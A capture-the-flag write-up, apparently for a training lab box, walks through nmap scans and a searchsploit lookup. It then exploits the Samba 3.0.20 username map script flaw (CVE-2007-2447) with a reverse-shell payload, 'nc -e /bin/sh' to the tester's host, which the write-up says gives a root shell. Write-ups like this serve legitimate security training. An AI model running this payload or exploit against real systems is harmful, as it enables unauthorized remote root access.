# Initial Scan

```
┌──(root㉿tacticaltimbz)-[/home/orlando/Downloads]
└─# nmap -sV -O 10.10.10.3            

Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 02:27 EDT
Nmap scan report for 10.10.10.3
Host is up (0.042s latency).
Not shown: 996 filtered tcp ports (no-response)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|WAP|remote management|webcam|printer
Running (JUST GUESSING): Linux 2.6.X|2.4.X (92%), Belkin embedded (90%), Control4 embedded (90%), Mobotix embedded (90%), Dell embedded (90%), Linksys embedded (90%), Tranzeo embedded (90%), Xerox embedded (90%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.23 cpe:/h:belkin:n300 cpe:/o:linux:linux_kernel:2.6.30 cpe:/h:dell:remote_access_card:5 cpe:/h:linksys:wet54gs5 cpe:/h:tranzeo:tr-cpq-19f cpe:/h:xerox:workcentre_pro_265 cpe:/o:linux:linux_kernel:2.4
Aggressive OS guesses: Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (90%), Control4 HC-300 home controller or Mobotix M22 camera (90%), Dell Integrated Remote Access Controller (iDRAC5) (90%), Dell Integrated Remote Access Controller (iDRAC6) (90%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (90%), Linux 2.4.21 - 2.4.31 (likely embedded) (90%), Linux 2.4.7 (90%), Citrix XenServer 5.5 (Linux 2.6.18) (90%), Linux 2.6.18 (90%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.19 seconds                                                                             
┌──(root㉿tacticaltimbz)-[/home/orlando/Downloads]
└─# 
```

---

# Identifying SMB Version
```
┌──(root㉿tacticaltimbz)-[/home/orlando/Downloads]
└─# nmap -p 139,445 -sV -Pn 10.10.10.3
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 02:18 EDT
Nmap scan report for 10.10.10.3
Host is up (0.022s latency).

PORT    STATE SERVICE     VERSION
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.68 seconds
                                                                                                                                                                                                                   
┌──(root㉿tacticaltimbz)-[/home/orlando/Downloads]
└─# 
```

---

# Samba 3 Exploit

```
┌──(root㉿tacticaltimbz)-[/home/orlando/Downloads]
└─# searchsploit samba | grep 3.0 | tr -d ' '
Samba2.0.7-SWATLoggingFailure|unix/remote/20340.c
Samba2.2.8(SolarisSPARC)-'trans2open'RemoteOverflow(Metasploit)|solaris_sparc/remote/16330.rb
Samba3.0.10(OSX)-'lsa_io_trans_names'HeapOverflow(Metasploit)|osx/remote/16875.rb
Samba3.0.10<3.3.5-FormatString/SecurityBypass|multiple/remote/10095.txt
Samba3.0.20<3.0.25rc3-'Username'mapscript'CommandExecution(Metasploit)|unix/remote/16320.rb
Samba3.0.21<3.0.24-LSAtransnamesHeapOverflow(Metasploit)|linux/remote/9950.rb
Samba3.0.24(Linux)-'lsa_io_trans_names'HeapOverflow(Metasploit)|linux/remote/16859.rb
Samba3.0.24(Solaris)-'lsa_io_trans_names'HeapOverflow(Metasploit)|solaris/remote/16329.rb
Samba3.0.27a-'send_mailslot()'RemoteBufferOverflow|linux/dos/4732.c
Samba3.0.29(Client)-'receive_smb_raw()'BufferOverflow(PoC)|multiple/dos/5712.pl
Samba3.0.4-SWATAuthorisationBufferOverflow|linux/remote/364.pl
Samba3.3.5-FormatString/SecurityBypass|linux/remote/33053.txt
Samba<3.0.20-RemoteHeapOverflow|linux/remote/7701.txt
SambarServer5.1-ScriptSourceDisclosure|cgi/remote/21390.txt
                                                                         
┌──(root㉿tacticaltimbz)-[/home/orlando/Downloads]
└─# 
```

# Exploit Link

https://github.com/Anonimo501/Samba-3.0.20-CVE-2007-2447

# Start a nc Listener

```
┌──(root㉿tacticaltimbz)-[/home/orlando/Downloads]
└─# nc -nlvp 4444                                                                                                                                                                                        
listening on [any] 4444 ...
connect to [10.10.16.2] from (UNKNOWN) [10.10.10.3] 50516
^C
                                                                            
┌──(root㉿tacticaltimbz)-[/home/orlando/Downloads]
└─# 

```

# Run the Exploit

```
┌──(.venv)─(root㉿tacticaltimbz)-[/home/orlando/Downloads/Samba-3.0.20-CVE-2007-2447]
└─# python3 smbExploit.py 10.10.10.3 139 'nc -e /bin/sh 10.10.16.2 4444'
[*] Sending the payload

```

# Conclusion

This exploit gives you a root shell. Moral of this box was to double check version numbers. There were some SMB shares that you could enumerate and try harder things, but in the end it was simple. 

